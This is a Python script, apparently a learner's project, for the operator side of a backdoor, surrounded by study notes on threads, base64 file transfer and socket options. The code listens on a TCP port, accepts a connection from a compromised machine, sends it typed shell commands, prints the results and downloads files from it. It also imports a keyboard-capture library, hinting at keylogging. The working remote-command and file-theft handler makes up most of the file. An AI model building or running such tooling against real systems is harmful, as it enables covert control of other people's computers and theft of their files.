"""
MAIN PROGRAM = CHILD THREAD  +  MAIN THREAD

Child threads = daemon and non-daemon(default)

eg:
  in a proram:
    * 1 main thread is there and 4 extra chreads
    * so these 4 threads are non-daemon threads by default.
  * when the main thread and these 4 daemon threads are not completed, the program execution will remian continue.
    * main thread is also a kind of non-daemon thread
  * We need to create daemon thread separately.
  * when the main thread and all non-daemon threads are finished in the program, the daemon threads will be ended automatically even if the work of daemon thread is still pending.

"""


# imports and dependencies
from pynput import keyboard
import os
import sys
import socket
import threading
import subprocess
import json
import base64
import requests
import time


def cmd_send(sock_fd, cmd):  # socket file descrypter is a conn. object and cmd is command data
    cmd = json.dumps(cmd)
    cmd = cmd.encode()
    sock_fd.send(cmd)


def cmd_recv(sock_fd):
    data = ''
    while True:
        data = data + sock_fd.recv(1024).decode()
        # recved cmd in bytes --> decoded it --> and converted into json
        try:
            data = json.loads(data)
            return data
        except:
            continue
          # try it:- "hi yash --> json --> completely recved at other end --> loads to convert it back to string"
          # else continue and first do recv the complete data then convert it back into string


def download(sock_fd, filename='file.txt'):
    data = cmd_recv(sock_fd)
    with open(filename, "wb") as file:
        file.write(base64.b64decode(data))


# main function for listening for connection from client and sending data
def main():
    HOST = "127.0.0.1"  # IP address
    PORT = 1234  # Port no. to listen on
    s = socket.socket()
    # s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #1st-socket family ipv4 and 2nd- socket type TCP conn.
    # s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    s.bind((HOST, PORT))
    s.listen(1)
    # the socket can have at most 1 incoming connections in its queue waiting to be accepted by the process. Once the queue is full, any additional connection attempts will be refused until a slot in the queue becomes available.

    print("[+] Listining...")
    connection_list = []
    sock_fd, conn_addr = s.accept()
    # connection_list.append(sock_fd)
    # thorugh sock_fd -- connection will occur and conn_addr will tell from where the connection is coming i.e. sock_fd is connection and conn_addr is address
    # target_info = sock_fd.recv(1025).decode().split(",")
    if (conn_addr):
        # targets = targets+str(conn_addr)
        print("[+] sock_fd ??:", sock_fd)
        print("[+] new connection:", conn_addr)
        # print("[+] Info: ", target_info)
        while True:
            # cmd = input("backsploit:~ ")
            cmd = input("cmd:~ ")
            cmd_send(sock_fd, cmd)
            # sock_fd.send(cmd.encode())#dont need this line as we are calling the send function
            if cmd[:8] == 'download':
                download(sock_fd)
                continue
            res = cmd_recv(sock_fd)
            # res = sock_fd.recv(1024) #dont need this line as we are calling the recv function
            print(res)
    sock_fd.close()
    s.close()


main()


""" 
Computer A                                                      Computer B
file.txt    ==> read                      ==> send.encode() ==> Write
image.jpg   ==> base64encode(read binary) ==> send          ==> base64decode(Write binary)

ALGO:
1. Read file in binary mode 
2. encoding file data into base64 because in binary mode the character are not readable effectively
3. encode data into bytes
4. send bytes
5. recv and decode to str
6. decoding base64
7. write bytes into file 

"""
""" 
============ what is the meaning of this code? ============ 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #1st-socket family ipv4 and 2nd- socket type TCP conn.
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
This code creates a TCP socket using the IPv4 address family and sets the socket option SO_REUSEADDR to 1 on the socket.

The first line of the code creates a socket object using the socket module's socket function. The function takes two arguments: AF_INET, which specifies that the socket should use the IPv4 address family, and SOCK_STREAM, which specifies that the socket should use the TCP protocol.

The second line of the code sets a socket option on the socket using the setsockopt method. The method takes three arguments:

SOL_SOCKET which specifies that the option should be applied at the socket level.
SO_REUSEADDR, which specifies that the option being set is to allow reuse of the local address the socket is bound to.
1 which specifies that the option should be enabled.
This option allows reuse of the local address the socket is bound to. It is useful in situations where a server has just been shut down and the operating system is still cleaning up the connection, causing the server's address to be temporarily unavailable. This option is typically set to avoid this problem by allowing the server to bind to the address immediately after the connection is closed.

"""